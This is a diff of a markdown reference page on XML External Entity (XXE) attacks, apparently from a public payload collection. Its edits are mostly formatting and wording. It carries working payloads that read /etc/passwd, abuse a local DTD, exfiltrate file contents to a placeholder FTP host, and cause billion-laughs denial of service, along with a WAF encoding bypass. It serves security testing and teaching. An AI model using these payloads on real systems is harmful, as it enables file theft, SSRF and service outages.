@@ -2,44 +2,38 @@
 
 > An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
 
-**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.    
-Syntax: `<!ENTITY entity_name "entity_value">`
-
-**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.    
-Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
-
 ## Summary
 
 - [Tools](#tools)
 - [Labs](#labs)
 - [Detect the vulnerability](#detect-the-vulnerability)
 - [Exploiting XXE to retrieve files](#exploiting-xxe-to-retrieve-files)
-  - [Classic XXE](#classic-xxe)
-  - [Classic XXE Base64 encoded](#classic-xxe-base64-encoded)
-  - [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
-  - [XInclude attacks](#xinclude-attacks)
+    - [Classic XXE](#classic-xxe)
+    - [Classic XXE Base64 encoded](#classic-xxe-base64-encoded)
+    - [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
+    - [XInclude attacks](#xinclude-attacks)
 - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-SSRF-attacks)
-- [Exploiting XXE to perform a deny of service](#exploiting-xxe-to-perform-a-deny-of-service)
-  - [Billion Laugh Attack](#billion-laugh-attack)
-  - [Yaml attack](#yaml-attack)
-  - [Parameters Laugh attack](#parameters-laugh-attack)
+- [Exploiting XXE to perform a denial of service](#exploiting-xxe-to-perform-a-denial-of-service)
+    - [Billion Laugh Attack](#billion-laugh-attack)
+    - [YAML attack](#yaml-attack)
+    - [Parameters Laugh attack](#parameters-laugh-attack)
 - [Exploiting Error Based XXE](#exploiting-error-based-xxe)
-   - [Error Based - Using Local DTD File](#error-based---using-local-dtd-file)
-   - [Error Based - Using Remote DTD](#error-based---using-remote-dtd)
+    - [Error Based - Using Local DTD File](#error-based---using-local-dtd-file)
+    - [Error Based - Using Remote DTD](#error-based---using-remote-dtd)
 - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
-  - [Blind XXE](#blind-xxe)
-  - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
-  - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
-  - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
+    - [Blind XXE](#blind-xxe)
+    - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
+    - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
+    - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
 - [WAF Bypasses](#waf-bypasses)
-  - [Bypass via character encoding](#bypass-via-character-encoding)
+   - [Bypass via character encoding](#bypass-via-character-encoding)
 - [XXE in Java](#xxe-in-java)
 - [XXE in exotic files](#xxe-in-exotic-files)
-  - [XXE inside SVG](#xxe-inside-svg)
-  - [XXE inside SOAP](#xxe-inside-soap)
-  - [XXE inside DOCX file](#xxe-inside-docx-file)
-  - [XXE inside XLSX file](#xxe-inside-xlsx-file)
-  - [XXE inside DTD file](#xxe-inside-dtd-file)
+    - [XXE inside SVG](#xxe-inside-svg)
+    - [XXE inside SOAP](#xxe-inside-soap)
+    - [XXE inside DOCX file](#xxe-inside-docx-file)
+    - [XXE inside XLSX file](#xxe-inside-xlsx-file)
+    - [XXE inside DTD file](#xxe-inside-dtd-file)
 - [Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents](#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents)
 
 ## Tools
@@ -91,25 +85,31 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   ```
 - [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
   ```ps1
-  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
+  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs
   ```
 
 ## Labs
 
 * [PortSwigger Labs for XXE](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
-  * [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
-  * [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
-  * [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
-  * [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
-  * [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
-  * [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
-  * [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
-  * [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
-  * [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
+    * [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
+    * [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
+    * [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
+    * [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
+    * [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
+    * [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
+    * [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
+    * [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
+    * [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
 * [GoSecure workshop - Advanced XXE Exploitation](https://gosecure.github.io/xxe-workshop) 
 
 
 ## Detect the vulnerability
+
+**Internal Entity**: If an entity is declared within a DTD it is called an internal entity.
+Syntax: `<!ENTITY entity_name "entity_value">`
+
+**External Entity**: If an entity is declared outside a DTD it is called an external entity. Identified by `SYSTEM`.
+Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 
 Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.
 
@@ -128,7 +128,7 @@ It might help to set the `Content-Type: application/xml` in the request when sen
 
 ### Classic XXE
 
-We try to display the content of the file `/etc/passwd` 
+We try to display the content of the file `/etc/passwd`.
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
@@ -145,14 +145,14 @@ We try to display the content of the file `/etc/passwd`
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-  <!DOCTYPE foo [  
+  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [  
+<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 ```
@@ -196,7 +196,7 @@ We try to display the content of the file `/etc/passwd`
 
 ### XInclude attacks
 
-When you can't modify the **DOCTYPE** element use the **XInclude** to target 
+When you can't modify the **DOCTYPE** element use the **XInclude** to target
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
@@ -219,7 +219,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 ```
 
 
-## Exploiting XXE to perform a deny of service
+## Exploiting XXE to perform a denial of service
 
 :warning: : These attacks might kill the service or the server, do not use them on the production.
 
@@ -236,7 +236,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 <data>&a4;</data>
 ```
 
-### Yaml attack
+### YAML attack
 
 ```xml
 a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
@@ -282,7 +282,8 @@ Short list of dtd files already stored on Linux systems; list them with `locate 
 
 The file `/usr/share/xml/fontconfig/fonts.dtd` has an injectable entity `%constant` at line 148: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`
 
-The final payload becomes: 
+The final payload becomes:
+
 ```xml
 <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
@@ -476,7 +477,7 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
 
-## WAF Bypasses 
+## WAF Bypasses
 
 ### Bypass via character encoding
 
@@ -490,7 +491,7 @@ XML parsers uses 4 methods to detect encoding:
 * XML declaration: `<?xml version="1.0" encoding="UTF-8"?>`
 
 | Encoding | BOM      | Example                             |              |
-|----------|----------|-------------------------------------|--------------|
+| -------- | -------- | ----------------------------------- | ------------ |
 | UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
 | UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
 | UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |
@@ -503,7 +504,7 @@ cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 
 ## XXE in Java
 
-Unsecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:
+Insecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:
 
 ![XXE Java security features overview infographics](https://semgrep.dev/docs/assets/images/cheat-sheets-xxe-java-infographics-1d1d5016802e3ab8f0886b62b8c81f21.png)
 
@@ -544,7 +545,7 @@ Ref.
 
 **OOB via SVG rasterization**
 
-*xxe.svg*
+_xxe.svg_
 
 ```xml
 <?xml version="1.0" standalone="yes"?>
@@ -638,8 +639,10 @@ Rebuild Excel file:
 
 ```
 $ cd XXE
-$ 7z u ../xxe.xlsx *
+$ zip -u ../xxe.xlsx *
 ```
+
+Warning: Use `zip -u` (https://infozip.sourceforge.net/Zip.html) and not `7z u` / `7za u` (https://p7zip.sourceforge.net/) or `7zz` (https://www.7-zip.org/) because they won't recompress it the same way and many Excel parsing libraries will fail to recognize it as a valid Excel file. A valid  magic byte signature with (`file XXE.xlsx`) will be shown as `Microsoft Excel 2007+` (with `zip -u`) and an invalid one will be shown as `Microsoft OOXML`.
 
 Add your blind XXE payload inside `xl/workbook.xml`.
 
@@ -650,7 +653,7 @@ Add your blind XXE payload inside `xl/workbook.xml`.
 <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 ```
 
-Alternativly, add your payload in `xl/sharedStrings.xml`:
+Alternatively, add your payload in `xl/sharedStrings.xml`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
@@ -666,7 +669,7 @@ And using FTP instead of HTTP allows to retrieve much larger files.
 
 ```xml
 <!ENTITY % d SYSTEM "file:///etc/passwd">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
 ```
 
 Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
@@ -729,29 +732,28 @@ From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
 
 ## References
 
-* [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
-* [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
-* [Detecting and exploiting XXE in SAML Interfaces](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html) - 6. Nov. 2014 - Von Christian Mainka
-* [[Gist] staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
-* [[Gist] mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
-* [Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
-* [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer)](http://en.hackdig.com/08/28075.htm)
-* [From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
-* [How we got read access on Google’s production servers](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/) April 11, 2014 by  detectify
-* [Blind OOB XXE At UBER 26+ Domains Hacked](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html) August 05, 2016 by Raghav Bisht
-* [OOB XXE through SAML](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf) by Sean	Melia @seanmeals
-* [XXE in Uber to read local files](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html) 01/2017
-* [XXE inside SVG](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/) JUNE 22, 2016 by YEO QUAN YANG
-* [Pentest XXE - @phonexicum](https://phonexicum.github.io/infosec/xxe.html)
-* [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/) - 12/12/2018 - Arseniy Sharoglazov
-* [Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd](https://portswigger.net/web-security/xxe)
-* [Automating local DTD discovery for XXE exploitation](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation) - July 16 2019 by Philippe Arteau
-* [EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
-* [excel-reader-xlsx #10](https://github.com/jmcnamara/excel-reader-xlsx/issues/10)
-* [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube)
-* [SynAck - A Deep Dive into XXE Injection](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) - 22 July 2019 - Trenton Gordon
-* [Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK
-* [XXE: How to become a Jedi](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) - Zeronights 2017 - Yaroslav Babin
-* [Payloads for Cisco and Citrix - Arseniy Sharoglazov](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
-* [Data exfiltration using XXE on a hardened server - Ritik Singh - Jan 29, 2022](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
-* [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - optistream](https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
+- [A Deep Dive into XXE Injection - Trenton Gordon - July 22, 2019](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)
+- [Automating local DTD discovery for XXE exploitation - Philippe Arteau - July 16, 2019](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)
+- [Blind OOB XXE At UBER 26+ Domains Hacked - Raghav Bisht - August 5, 2016](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html)
+- [CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - Julien Szlamowicz, Sebastien Dudek - March 11, 2019](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf)
+- [Data exfiltration using XXE on a hardened server - Ritik Singh - January 29, 2022](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
+- [Detecting and exploiting XXE in SAML Interfaces - Christian Mainka (@CheariX) - November 6, 2014](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
+- [Exploiting XXE in file upload functionality - Will Vandevanter (@_will_is_) - November 19, 2015](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
+- [EXPLOITING XXE WITH EXCEL - Marc Wickenden - November 12, 2018](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
+- [Exploiting XXE with local DTD files - Arseniy Sharoglazov - December 12, 2018](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+- [From blind XXE to root-level file read access - Pieter Hiele - December 12, 2018](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
+- [How we got read access on Google’s production servers - Detectify - April 11, 2014](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
+- [Midnight Sun CTF 2019 Quals - Rubenscube - jbz - April 6, 2019](https://jbz.team/midnightsunctfquals2019/Rubenscube)
+- [OOB XXE through SAML - Sean Melia (@seanmeals) - January 2016](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
+- [Payloads for Cisco and Citrix - Arseniy Sharoglazov - January 1, 2016](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+- [Pentest XXE - @phonexicum - March 9, 2020](https://phonexicum.github.io/infosec/xxe.html)
+- [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - Optistream - May 27, 2024](https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
+- [XML attacks - Mariusz Banach (@mgeeky) - December 21, 2017](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
+- [XML external entity (XXE) injection - PortSwigger - May 29, 2019](https://portswigger.net/web-security/xxe)
+- [XML External Entity (XXE) Processing - OWASP - December 4, 2019](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
+- [XML External Entity Prevention Cheat Sheet - OWASP - February 16, 2019](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer) - Bruno Morisson - August 14, 2015](https://labs.integrity.pt/articles/xxe-all-the-things-including-apple-ioss-office-viewer/)
+- [XXE in Uber to read local files - httpsonly - January 24, 2017](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
+- [XXE inside SVG - YEO QUAN YANG - June 22, 2016](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
+- [XXE payloads - Etienne Stalmans (@staaldraad) - July 7, 2016](https://gist.github.com/staaldraad/01415b990939494879b4)
+- [XXE: How to become a Jedi - Yaroslav Babin - November 6, 2018](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf)
